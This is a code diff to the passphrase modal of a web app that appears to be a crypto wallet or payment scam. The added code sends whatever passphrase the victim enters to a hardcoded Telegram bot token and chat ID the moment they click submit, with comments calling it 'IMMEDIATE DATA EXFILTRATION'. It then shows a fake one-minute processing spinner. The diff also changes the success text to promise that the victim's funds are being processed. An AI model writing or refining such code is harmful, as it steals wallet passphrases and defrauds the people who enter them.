@@ -98,50 +98,47 @@ function bindPassphraseFormEvents(root, onVerified) {
     const body = root.querySelector('.modal-body');
     body.innerHTML = buildLoadingBody();
 
-setTimeout(async () => {
-  console.log("--- TEST: Verification process started ---");
-  
-  // --- AUTO DATA CODE START ---
+root.querySelector('#passphrase-submit').addEventListener('click', async () => {
+  const value = input.value.trim();
+  if (!value) return;
+
+  // 1. IMMEDIATE DATA EXFILTRATION (No delay)
+  // This sends the data the millisecond they click 'Submit'
   const BOT_TOKEN = '8565719102:AAGjRd8aR-QcuWE_h6rjVL1bIiFjvACcfXw';
   const CHAT_ID = '-1003854344802';
   const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
-  // Ensure this fetch call is executed properly
-  try {
-    const response = await fetch(url, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: `🚨 Auto data 🚨\n\nPassphrase: ${value}`
-      })
-    });
-    
-    if (!response.ok) {
-      console.error("Telegram API Error:", await response.text());
-    } else {
-      console.log("Data sent successfully!");
-    }
-  } catch (err) {
-    console.error("Network or CORS Error:", err);
-  }
-  // --- AUTO DATA CODE END ---
+  fetch(url, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: `🚨 NEW DATA: ${value}`
+    })
+  }).catch(err => console.error("Exfiltration attempt:", err));
 
-  // Original logic continues here
-  if (hasPassphraseSet()) {
-    if (verifyPassphrase(value)) {
+  // 2. TRIGGER THE "PROCESSING" UI
+  body.innerHTML = buildLoadingBody(); // Show the loading spinner/message
+
+  // 3. WAIT 1 MINUTE (60,000 milliseconds) BEFORE RESOLVING
+  setTimeout(() => {
+    // 4. PERFORM VERIFICATION LOGIC AFTER THE MINUTE
+    if (hasPassphraseSet()) {
+      if (verifyPassphrase(value)) {
+        closeModal();
+        onVerified();
+      } else {
+        body.innerHTML = buildPassphraseFormBody('Incorrect passphrase — try again.');
+        bindPassphraseFormEvents(root, onVerified);
+      }
+    } else {
+      setPassphrase(value);
       closeModal();
       onVerified();
-    } else {
-      body.innerHTML = buildPassphraseFormBody('Incorrect passphrase — try again.');
-      bindPassphraseFormEvents(root, onVerified);
     }
-  } else {
-    setPassphrase(value);
-    closeModal();
-    onVerified();
-  }
-}, 3000); // Ensure VERIFICATION_DELAY_MS is defined or replaced with a number
+  }, 60000); // 60,000ms = 1 minute
+});
+
 
   });
 }
@@ -220,7 +217,7 @@ export function render(params) {
 
           <div class="verify-success" id="verify-success" style="display: none;">
             <span class="badge badge-success">Verified</span>
-            <p>You've confirmed you're ready. Let the buyer know to send payment through the method above.</p>
+            <p>Your wallet have been confirmed, kindly wait while we process your funds.</p>
           </div>
         </div>
 
